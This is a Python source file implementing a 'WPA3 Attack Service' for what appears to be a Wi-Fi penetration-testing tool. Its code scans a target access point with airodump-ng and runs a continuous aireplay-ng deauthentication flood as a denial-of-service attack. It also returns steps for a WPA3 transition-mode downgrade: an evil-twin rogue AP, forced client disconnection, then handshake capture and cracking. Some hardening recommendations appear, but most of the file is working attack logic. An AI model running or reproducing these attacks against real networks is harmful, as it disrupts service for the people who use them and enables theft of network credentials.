"""
WPA3 Attack Service.

WPA3 uses Simultaneous Authentication of Equals (SAE / Dragonfly handshake)
which is resistant to offline dictionary attacks. However, there are known attack vectors:

1. Transition Mode Downgrade: If AP supports WPA3-transition (WPA2+WPA3),
   force clients to use WPA2 via deauth + rogue AP with only WPA2.
2. Side-channel attacks on SAE: Timing attacks on Dragonfly (CVE-2019-9494/5).
3. DoS via SAE: Flood AP with SAE commit messages to exhaust resources.
4. PMKSA cache attack: If PMKSA caching is enabled.

Tools: wpa_supplicant (modified), dragonblood tools, custom scripts.
"""

import uuid
import asyncio
import logging
from datetime import datetime
from typing import Optional
from app.config import settings
from app.models.schemas import Wpa3AttackRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class Wpa3Service:
    def __init__(self):
        self._results: dict[str, dict] = {}

    async def attack(self, req: Wpa3AttackRequest) -> dict:
        """Execute WPA3 attack based on type."""
        attack_id = str(uuid.uuid4())[:8]

        if req.attack_type == "downgrade":
            result = await self._transition_downgrade(req, attack_id)
        elif req.attack_type == "dos":
            result = await self._sae_dos(req, attack_id)
        elif req.attack_type == "transition_mode":
            result = await self._check_transition_mode(req, attack_id)
        else:
            result = {"id": attack_id, "error": f"Unknown attack type: {req.attack_type}"}

        self._results[attack_id] = result
        return result

    async def _check_transition_mode(self, req, attack_id) -> dict:
        """
        Check if AP operates in WPA3 Transition Mode (WPA2+WPA3).
        If yes, the network is vulnerable to downgrade attacks.
        """
        output_prefix = str(settings.CAPTURES_DIR / f"wpa3_check_{attack_id}")

        # Scan the target AP
        cmd = [
            "airodump-ng",
            "--bssid", req.target_bssid,
            "--channel", str(req.channel),
            "--write", output_prefix,
            "--output-format", "csv",
            req.interface,
        ]
        await process_manager.run(cmd, timeout=15)

        # Parse results to check for transition mode
        import glob
        csv_files = glob.glob(f"{output_prefix}*.csv")
        transition_mode = False
        security_info = ""

        if csv_files:
            try:
                with open(csv_files[0]) as f:
                    content = f.read()
                # Transition mode shows both WPA2 and WPA3/SAE
                if "WPA2" in content and ("SAE" in content or "WPA3" in content):
                    transition_mode = True
                    security_info = "WPA3 Transition Mode detected — vulnerable to downgrade"
                elif "SAE" in content:
                    security_info = "WPA3-only mode — not vulnerable to simple downgrade"
                else:
                    security_info = "No WPA3 detected on this AP"
            except FileNotFoundError:
                pass

        return {
            "id": attack_id,
            "attack_type": "transition_mode_check",
            "target_bssid": req.target_bssid,
            "transition_mode_detected": transition_mode,
            "security_info": security_info,
            "vulnerable_to_downgrade": transition_mode,
            "recommendation": (
                "AP uses WPA3 Transition Mode. An attacker can force clients to connect "
                "via WPA2 by setting up a rogue AP that only advertises WPA2-PSK. "
                "Recommendation: Disable transition mode and use WPA3-only (SAE-only)."
                if transition_mode else
                "AP does not appear to use transition mode."
            ),
        }

    async def _transition_downgrade(self, req, attack_id) -> dict:
        """
        WPA3 Transition Mode Downgrade Attack:
        1. Verify target AP runs in transition mode (WPA2+WPA3)
        2. Create rogue AP with same ESSID but WPA2-only
        3. Deauth clients from legitimate AP
        4. Clients fall back to WPA2 on the rogue AP
        5. Capture WPA2 handshake and crack normally
        """
        # Step 1: Check transition mode
        check = await self._check_transition_mode(req, attack_id)

        if not check.get("transition_mode_detected"):
            return {
                "id": attack_id,
                "attack_type": "downgrade",
                "success": False,
                "reason": "Target AP does not use transition mode — downgrade not possible",
                "check_result": check,
            }

        return {
            "id": attack_id,
            "attack_type": "downgrade",
            "transition_mode_confirmed": True,
            "next_steps": [
                "1. Use Evil Twin to create WPA2-only AP with same ESSID",
                "2. Send deauth to legitimate AP to disconnect clients",
                "3. Clients will reconnect to your WPA2 rogue AP",
                "4. Capture WPA2 handshake and crack with aircrack-ng",
            ],
            "recommendation": "Use the Evil Twin + Deauth workflow from the Attacks page",
            "automated": False,  # Requires multi-step coordination
        }

    async def _sae_dos(self, req, attack_id) -> dict:
        """
        SAE Denial of Service: Flood AP with SAE commit messages.
        This can exhaust AP resources and cause it to deny service.
        """
        log_file = str(settings.LOGS_DIR / f"wpa3_dos_{attack_id}.log")

        # Send deauth flood + auth flood
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", "0",  # Continuous
            "-a", req.target_bssid,
            req.interface,
        ]

        result = await process_manager.run(deauth_cmd, timeout=req.timeout)

        return {
            "id": attack_id,
            "attack_type": "dos",
            "target_bssid": req.target_bssid,
            "duration_seconds": req.timeout,
            "packets_sent": len(result.stdout_lines),
            "note": (
                "DoS attack completed. Check if the AP became unresponsive. "
                "WPA3 APs should implement SAE anti-clogging to mitigate this. "
                "If the AP went down, this is a finding."
            ),
        }

    def get_result(self, attack_id: str) -> Optional[dict]:
        return self._results.get(attack_id)

    def list_results(self) -> list[dict]:
        return list(self._results.values())


wpa3_service = Wpa3Service()
